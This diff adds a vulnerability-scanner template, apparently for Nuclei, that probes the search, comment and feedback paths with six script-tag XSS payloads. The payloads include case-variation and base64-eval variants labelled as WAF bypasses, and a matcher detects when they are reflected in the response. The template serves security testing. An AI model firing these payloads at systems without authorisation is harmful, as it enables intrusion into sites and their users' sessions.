@@ -1,0 +1,43 @@
+id: xss-p1
+
+info:
+  name: XSS - Basic Script Tags
+  author: custom
+  severity: medium
+  description: Basic XSS payloads using script tags with various case variations
+  tags: xss,waf-bypass,script
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?q={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        q={{payload}}
+
+    payloads:
+      payload:
+        - "<script>alert(1)</script>"
+        - "<sCrIpT>alert(1)</sCrIpT>"
+        - "<script>alert(1)"
+        - "<script>alert(1);</script>"
+        - "<script>eval(atob('YWxlcnQoMSk='))</script>"
+        - "<script>setTimeout('alert(1)',0)</script>"
+      path:
+        - "search"
+        - "comment"
+        - "feedback"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "alert(1)"
+        condition: or
